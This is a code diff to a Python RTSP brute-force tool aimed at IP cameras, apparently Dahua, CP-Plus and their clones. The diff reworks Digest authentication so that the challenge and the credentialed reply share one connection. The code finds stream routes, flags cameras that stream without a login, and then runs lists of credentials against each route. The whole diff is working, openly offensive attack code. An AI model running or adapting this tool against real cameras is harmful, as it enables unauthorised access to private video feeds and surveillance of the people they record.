@@ -209,6 +209,10 @@ def substitute(path, username, password, channel=1, width=1280, height=720):
     tokens["HEIGHT"] = str(height)
     tokens["USERNAME"] = quote(username, safe="")
     tokens["PASSWORD"] = quote(password, safe="")
+    # ``[AUTH]`` (e.g. ``...&authbasic=[AUTH]`` in some CP-Plus/Dahua templates)
+    # is a base64 ``user:pass`` blob. Substituting it keeps the reported URL
+    # valid; the actual login still rides the Digest ``Authorization`` header.
+    tokens["AUTH"] = b64encode(f"{username}:{password}".encode()).decode()
 
     def repl(match):
         return tokens.get(match.group(1).upper(), match.group(0))
@@ -503,12 +507,23 @@ def _auth_header(www, user, password, method, uri):
     return ""
 
 
-def _describe(host, port, uri, timeout, cseq, auth=None):
-    """Send one RTSP DESCRIBE and return ``(status_code, headers)``.
+def _open(host, port, timeout):
+    """Open one RTSP TCP connection, or return None on failure."""
+    try:
+        sock = socket.create_connection((host, port), timeout=timeout)
+        sock.settimeout(timeout)
+        return sock
+    except OSError:
+        return None
 
-    ``status_code`` is None on a socket error. A fresh connection is used per
-    request; the Digest nonce is reusable across connections, so caching the
-    challenge (below) still avoids re-challenging per credential.
+
+def _send_describe(sock, uri, cseq, auth=None):
+    """Send one RTSP DESCRIBE on an already-open socket; return ``(code, headers)``.
+
+    ``code`` is None on a socket error. The socket is left open so a Digest
+    challenge and its authenticated reply can be exchanged over the SAME
+    connection — mandatory for cameras (Dahua/CP-Plus and their many clones)
+    whose nonce/realm is bound to the TCP connection and is invalid on any other.
     """
     lines = [f"DESCRIBE {uri} RTSP/1.0", f"CSeq: {cseq}",
              "User-Agent: RTSP-Brute-Force", "Accept: application/sdp"]
@@ -516,18 +531,16 @@ def _describe(host, port, uri, timeout, cseq, auth=None):
         lines.append(f"Authorization: {auth}")
     request = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1")
     try:
-        with socket.create_connection((host, port), timeout=timeout) as sock:
-            sock.settimeout(timeout)
-            sock.sendall(request)
-            raw = b""
-            while b"\r\n\r\n" not in raw and len(raw) < 8192:
-                try:
-                    chunk = sock.recv(2048)
-                except socket.timeout:
-                    break
-                if not chunk:
-                    break
-                raw += chunk
+        sock.sendall(request)
+        raw = b""
+        while b"\r\n\r\n" not in raw and len(raw) < 8192:
+            try:
+                chunk = sock.recv(2048)
+            except socket.timeout:
+                break
+            if not chunk:
+                break
+            raw += chunk
     except OSError:
         return None, {}
     text = raw.decode("latin-1", "replace")
@@ -541,6 +554,55 @@ def _describe(host, port, uri, timeout, cseq, auth=None):
     return code, headers
 
 
+def _describe_unauth(host, port, uri, timeout):
+    """One unauthenticated DESCRIBE on its own connection. Returns ``(code, www)``."""
+    sock = _open(host, port, timeout)
+    if sock is None:
+        return None, ""
+    try:
+        code, headers = _send_describe(sock, uri, 1)
+        return code, headers.get("www-authenticate", "")
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
+def _describe_auth(host, port, uri, user, password, timeout):
+    """Full authenticated DESCRIBE over ONE connection: fetch the challenge and
+    send the credentialed reply on the same socket. Returns the final status
+    code (None on a socket error).
+
+    A single shared connection is mandatory: these cameras mint a fresh,
+    connection-bound Digest nonce/realm on every TCP connection, so a challenge
+    fetched on one socket can never be answered on another.
+    """
+    sock = _open(host, port, timeout)
+    if sock is None:
+        return None
+    try:
+        code, headers = _send_describe(sock, uri, 1)
+        if code not in (401, 403):          # 200 open, or 404/None -> decisive
+            return code
+        www = headers.get("www-authenticate", "")
+        auth = _auth_header(www, user or "", password or "", "DESCRIBE", uri)
+        if not auth:
+            return code
+        code, headers = _send_describe(sock, uri, 2, auth=auth)
+        # Refresh once on an expired (stale) nonce, still on this connection.
+        if code in (401, 403) and "stale" in headers.get("www-authenticate", "").lower():
+            www = headers.get("www-authenticate", "")
+            auth = _auth_header(www, user or "", password or "", "DESCRIBE", uri)
+            code, headers = _send_describe(sock, uri, 3, auth=auth)
+        return code
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
 def _route_uri(host, port, raw_path, user, password):
     path = substitute(raw_path, user or "", password or "")
     if not path.startswith("/"):
@@ -551,60 +613,40 @@ def _route_uri(host, port, raw_path, user, password):
 def rtsp_bruteforce(host, routes, creds, timeout):
     """Two-phase native RTSP attack. Returns a result dict on success, else None.
 
-    Phase A (route discovery): an unauthenticated DESCRIBE per route. A route
+    Phase A (route discovery): one unauthenticated DESCRIBE per route. A route
     that streams without auth (200) is an immediate open-access hit; routes that
-    demand auth (401/403) are kept, and their challenge cached so the credential
-    attack never re-challenges. Routes that 404/400 are dropped.
+    demand auth (401/403) are kept as candidates; routes that 404/400 are dropped.
 
-    Phase B (credential attack): try each credential against the primary route.
-    A 200 is success. A 404 means the credential is valid but the path is wrong
-    (auth-first cameras answer 401 for every path until authenticated), so we
-    sweep the remaining routes with that now-known-good credential.
+    Phase B (credential attack): for each credential, a full challenge+response
+    handshake (a fresh connection per attempt, challenge and reply on the SAME
+    socket) against the primary route. A 200 is success. A 404 means the
+    credential is valid but the path is wrong (auth-first cameras answer 401 for
+    every path until authenticated, then 404 for a wrong path), so we sweep the
+    remaining routes with that now-known-good credential.
     """
-    challenge = {}          # (path, port) -> WWW-Authenticate string
     auth_routes = []
     for raw_path, port in routes:
         uri = _route_uri(host, port, raw_path, "", "")
-        code, headers = _describe(host, port, uri, timeout, 1)
+        code, _ = _describe_unauth(host, port, uri, timeout)
         if code == 200:
             return {"user": "", "password": "", "url": uri, "unauthenticated": True}
         if code in (401, 403):
             auth_routes.append((raw_path, port))
-            challenge[(raw_path, port)] = headers.get("www-authenticate", "")
 
     candidate_routes = auth_routes or routes
     if not candidate_routes:
         return None
 
-    def attempt(raw_path, port, user, password):
-        uri = _route_uri(host, port, raw_path, user, password)
-        www = challenge.get((raw_path, port))
-        if www is None:                      # not challenged yet (fallback path)
-            code, headers = _describe(host, port, uri, timeout, 1)
-            www = headers.get("www-authenticate", "")
-            challenge[(raw_path, port)] = www
-            if code != 401 and code != 403:  # 200 open, or 404/None -> decisive
-                return code, uri
-        auth = _auth_header(www, user or "", password or "", "DESCRIBE", uri)
-        if not auth:
-            return 401, uri
-        code, headers = _describe(host, port, uri, timeout, 2, auth=auth)
-        # Refresh once on an expired (stale) nonce.
-        if code in (401, 403) and "stale" in headers.get("www-authenticate", "").lower():
-            www = headers.get("www-authenticate", "")
-            challenge[(raw_path, port)] = www
-            auth = _auth_header(www, user or "", password or "", "DESCRIBE", uri)
-            code, headers = _describe(host, port, uri, timeout, 3, auth=auth)
-        return code, uri
-
     primary_path, primary_port = candidate_routes[0]
     for user, password in creds:
-        code, uri = attempt(primary_path, primary_port, user, password)
+        uri = _route_uri(host, primary_port, primary_path, user, password)
+        code = _describe_auth(host, primary_port, uri, user, password, timeout)
         if code == 200:
             return {"user": user, "password": password, "url": uri}
         if code == 404:  # credential valid, wrong path -> sweep the other routes
             for raw_path, port in candidate_routes:
-                sweep_code, sweep_uri = attempt(raw_path, port, user, password)
+                sweep_uri = _route_uri(host, port, raw_path, user, password)
+                sweep_code = _describe_auth(host, port, sweep_uri, user, password, timeout)
                 if sweep_code == 200:
                     return {"user": user, "password": password, "url": sweep_uri}
             # Authenticated, but none of our known routes streamed. Report the
